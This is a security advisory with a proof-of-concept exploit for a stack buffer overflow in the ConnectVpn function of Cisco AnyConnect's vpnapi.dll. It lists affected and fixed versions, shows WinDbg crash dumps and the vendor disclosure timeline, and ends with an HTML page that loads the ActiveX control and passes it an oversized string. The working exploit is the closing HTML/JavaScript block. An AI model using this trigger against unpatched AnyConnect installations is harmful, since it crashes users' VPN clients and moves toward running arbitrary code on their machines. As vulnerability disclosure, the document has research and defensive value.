@@ -1,0 +1,244 @@
+<!--
+
+Cisco AnyConnect Secure Mobility Client Remote Command Execution
+
+
+Vendor:  Cisco Systems, Inc.
+Product web page: http://www.cisco.com
+Affected version: 2.x
+                  3.0
+                  3.0.0A90
+                  3.1.0472
+                  3.1.05187
+                  3.1.06073
+                  3.1.06078
+                  3.1.06079
+                  3.1.07021
+                  3.1.08009
+                  4.0.00013
+                  4.0.00048
+                  4.0.00051
+                  4.0.02052
+                  4.0.00057
+                  4.0.00061
+                  4.1.00028
+
+Fixed in: 3.1.09005
+          4.0.04006
+          4.1.02004
+          4.1.02011
+
+Summary: Cisco AnyConnect Secure Mobility Solution empowers your
+employees to work from anywhere, on corporate laptops as well as
+personal mobile devices, regardless of physical location. It provides
+the security necessary to help keep your organizationâ€™s data safe
+and protected.
+
+Desc: The AnyConnect Secure Mobility Client VPN API suffers from
+a stack buffer overflow vulnerability when parsing large amount of
+bytes to the 'strHostNameOrAddress' parameter in 'ConnectVpn' function
+which resides in the vpnapi.dll library, resulting in memory corruption
+and overflow of the stack. An attacker can gain access to the system
+of the affected node and execute arbitrary code.
+
+==========================================================================
+
+(f48.10cc): Unknown exception - code 000006ba (first chance)
+(f48.10cc): C++ EH exception - code e06d7363 (first chance)
+(f48.10cc): C++ EH exception - code e06d7363 (first chance)
+(f48.10cc): Stack overflow - code c00000fd (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program Files (x86)\Cisco\Cisco AnyConnect Secure Mobility Client\vpnapi.dll - 
+eax=00232000 ebx=02df9128 ecx=00000000 edx=088f0024 esi=01779c42 edi=088f0022
+eip=748b6227 esp=0032ea14 ebp=0032eab0 iopl=0         nv up ei pl nz na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00210206
+vpnapi!ConnectIfcData::setConfigCookie+0x9195:
+748b6227 8500            test    dword ptr [eax],eax  ds:002b:00232000=00000000
+0:000> g
+(f48.10cc): Stack overflow - code c00000fd (!!! second chance !!!)
+eax=00232000 ebx=02df9128 ecx=00000000 edx=088f0024 esi=01779c42 edi=088f0022
+eip=748b6227 esp=0032ea14 ebp=0032eab0 iopl=0         nv up ei pl nz na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00210206
+vpnapi!ConnectIfcData::setConfigCookie+0x9195:
+748b6227 8500            test    dword ptr [eax],eax  ds:002b:00232000=00000000
+0:000> d edi
+088f0022  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+088f0032  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+088f0042  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+088f0052  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+088f0062  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+088f0072  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+088f0082  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+088f0092  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+0:000> d edx
+088f0024  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+088f0034  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+088f0044  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+088f0054  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+088f0064  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+088f0074  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+088f0084  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+088f0094  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+
+<12308000 B
+
+----
+
+>512150-512154 B
+
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Windows\syswow64\RPCRT4.dll - 
+eax=004d2384 ebx=76e9b7e4 ecx=00193214 edx=00000000 esi=00193214 edi=00193738
+eip=75440fc4 esp=00193000 ebp=00193008 iopl=0         nv up ei pl nz na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00210206
+RPCRT4!UuidCreate+0x835:
+75440fc4 56              push    esi
+0:000> g
+(1a50.1e40): Stack overflow - code c00000fd (!!! second chance !!!)
+eax=004d2384 ebx=76e9b7e4 ecx=00193214 edx=00000000 esi=00193214 edi=00193738
+eip=75440fc4 esp=00193000 ebp=00193008 iopl=0         nv up ei pl nz na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00210206
+RPCRT4!UuidCreate+0x835:
+75440fc4 56              push    esi
+0:000> d eax
+004d2384  46 75 6e 63 74 69 6f 6e-3a 20 43 6c 69 65 6e 74  Function: Client
+004d2394  49 66 63 42 61 73 65 3a-3a 67 65 74 43 6f 6e 6e  IfcBase::getConn
+004d23a4  65 63 74 4d 67 72 0a 46-69 6c 65 3a 20 2e 5c 43  ectMgr.File: .\C
+004d23b4  6c 69 65 6e 74 49 66 63-42 61 73 65 2e 63 70 70  lientIfcBase.cpp
+004d23c4  0a 4c 69 6e 65 3a 20 32-35 38 30 0a 43 61 6c 6c  .Line: 2580.Call
+004d23d4  20 74 6f 20 67 65 74 43-6f 6e 6e 65 63 74 4d 67   to getConnectMg
+004d23e4  72 20 77 68 65 6e 20 6e-6f 74 20 63 6f 6e 6e 65  r when not conne
+004d23f4  63 74 65 64 20 74 6f 20-41 67 65 6e 74 2e 00 00  cted to Agent...
+0:000> d
+004d2404  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
+004d2414  00 00 00 00 41 41 41 41-41 41 41 41 41 41 41 41  ....AAAAAAAAAAAA
+004d2424  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
+004d2434  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
+004d2444  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
+004d2454  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
+004d2464  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
+004d2474  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
+0:000> d esp+1500
+00194500  00 00 00 00 f8 e6 28 00-ec 3c 85 74 04 00 00 00  ......(..<.t....
+00194510  ff ff ff ff 00 00 00 00-00 00 00 00 00 00 00 00  ................
+00194520  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
+00194530  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
+00194540  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
+00194550  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
+00194560  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
+00194570  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
+
+==========================================================================
+
+
+Tested on: Microsoft Windows 7 Professional SP1 (EN)
+           Microsoft Windows 7 Ultimate SP1 (EN)
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Vendor status:
+
+[25.03.2015] Vulnerability discovered.
+[28.03.2015] Vendor contacted.
+[29.03.2015] Vendor responds asking more details.
+[13.04.2015] Sent details to the vendor.
+[15.04.2015] Asked vendor for status update.
+[15.04.2015] Vendor opens case #PSIRT-0089839229, informing that as soon as incident manager takes ownership of the case they will be in contact.
+[22.04.2015] Asked vendor for status update.
+[28.04.2015] No reply from the vendor.
+[04.05.2015] Asked vendor for status update.
+[05.05.2015] Vendor assigns case PSIRT-0089839229, defect CSCuu18805 under investigation.
+[12.05.2015] Asked vendor for confirmation.
+[13.05.2015] Vendor resolved the issue, not sure for the release date.
+[14.05.2015] Asked vendor for approximate scheduled release date.
+[15.05.2015] Vendor informs that the defect is public (CSCuu18805).
+[19.05.2015] Asked vendor for release information.
+[19.05.2015] Vendor informs releases expected to be on June 7th for 3.1 MR9 and May 31st for 4.1 MR2.
+[11.06.2015] Vendor releases version 4.1.02011 and 3.1.09005 to address this issue.
+[13.06.2015] Public security advisory released.
+
+
+Advisory ID: ZSL-2015-5246
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2015-5246.php
+Vendor: https://tools.cisco.com/bugsearch/bug/CSCuu18805
+
+
+25.03.2015
+
+-->
+
+
+<!DOCTYPE html>
+<html>
+<head>
+<title>Cisco AnyConnect Secure Mobility Client VPN API Stack Overflow</title>
+</head>
+<body>
+<button onclick="O_o()">Launch</button>
+<object id="cisco" classid="clsid:{C15C0F4F-DDFB-4591-AD53-C9A71C9C15C0}"></object>
+<script language="JavaScript">
+
+function O_o() {
+  //targetFile = "C:\Program Files (x86)\Cisco\Cisco AnyConnect Secure Mobility Client\vpnapi.dll"
+  //prototype  = "Sub ConnectVpn ( ByVal strHostNameOrAddress As String )"
+  //memberName = "ConnectVpn"
+  //progid     = "VpnApiLib.VpnApi"
+
+  var netv = Array(255712).join("ZS");
+  var push = //~~~~~~~~~~~~~~~~~~~~~~~~//
+
+                   /*(()()())*/
+                 "ZSZSZSZSZSZSZ"+
+                "SZSZSZSZSZSZSZS"+
+              "ZSZSZSZSZSZSZSZSZSZS"+
+            "ZSZSZSZSZSZSZSZSZSZSZSZS"+
+           "ZSZSZSZSZSZSZSZSZSZSZSZSZS"+
+           "ZSZSZSZ"+  "SZSZ"  +"SZSZSZ"+
+           "SZSZSZ"+   "SZSZ"  +"SZSZSZ"+
+            "SZSZS"+   "ZSZS"  +"ZSZSZ"+
+             "SZSZS"+  "ZSZS" +"ZSZSZ"+
+              "SZSZS"+"ZSZSZ"+"SZSZS"+
+             "SZSZSZSZSZSZSZSZSZSZSZS"+
+            "ZSZSZSZSZSZSZSZSZSZSZSZSZ"+
+        "SZSZSZSZSZSZSZSZSZSZSZSZSZSZSZSZS"+
+      "ZSZSZSZSZSZSZSZSZSZSZSZSZSZSZSZSZSZSZ"+
+      "SZSZSZSZSZSZSZSZSZSZSZSZSZSZSZSZSZSZS"+
+      "ZSZSZSZ"    +"SZSZSZSZSZSZ"+    "SZSZ"+
+     "SZSZSZS"    +"ZSZSZSZSZSZSZS"+    "ZSZS"+
+     "ZSZSZSZ"    +"SZSZSZSZSZSZSZ"+    "SZSZ"+
+     "SZSZSZSZ"+  "SZSZSZSZSZSZSZSZS"+  "ZSZSZ"+
+     "SZS"+ "ZSZ"+ "SZS"+ "ZSZ" +"SZS"  +"ZSZ"+
+     "SZS"+ "ZSZ"+ "SZS"+ "ZSZ" +"SZS"  +"ZSZ"+
+      "SZS"+ "ZSZ"+ "SZS"+ "ZSZ" +"SZS"  +"ZSZ"+
+        "SZS"+ "ZSZ"+ "SZS"+ "ZSZ" +"SZS"  +"ZSZ"+
+         "SZS"+ "ZSZ"+ "SZS"+ "ZSZ" +"SZS"  +"ZSZ"+
+         "SZS"+ "ZSZ"+ "SZS"+ "ZSZ" +"SZS"  +"ZSZ"+
+       "SZS"+ "ZSZ"+ "SZS" +"ZSZ" +"SZS"  +"ZSZ"+
+      "SZS"+ "ZSZ"+ "SZS"+ "ZSZ"+ "SZS"  +"ZSZ"+
+    "SZS"+ "ZSZ"+ "SZS"+ "ZSZ"+ "SZS"  +"ZSZ"+
+ "SZS"+ "ZSZ"+ "SZS"+ "ZSZ"+ "SZS"  +"ZSZ"+
+ "SZS"+ "ZSZ"+ "SZS"+ "ZSZ"+ "SZS"  +"ZSZ"+
+    "SZS"+ "ZSZ"+ "SZS"+ "ZSZ"+ "SZS"  +"ZSZ"+
+      "SZS"+ "ZSZ"+ "SZS"+ "ZSZ"+ "SZS"  +"ZSZ"+
+        "SZS"+ "ZSZ"+ "SZS"+ "ZSZ"+ "SZS"  +"ZSZ"+
+           "SZS"+ "ZSZ"+ "SZS"+ "ZSZ"+ "SZS"  +"ZSZ"+
+             "SZS"+ "ZSZ"+ "SZS"+ "ZSZ"+ "SZS"  +"ZSZ"+
+              "SZ"  +"SZ"  +"SZ"  +"SZ"  +"SZ"+  "SZ"+
+              "SZ"  +"SZ"  +"SZ"  +"SZ"  +"SZ"+  "SZ"+
+               "S"+  "Z"+  "S"+  "Z"+   "S"+    "Z"+
+              "S"+  "Z"+  "S"+  "Z"+   "S"+    "S"+
+             "S"+  "Z"+  "S"+  "Z"+   "S"+    "S";
+
+
+  var godeep = netv.concat(push);
+  cisco.ConnectVpn godeep
+}
+
+</script>
+</body>
+</html>
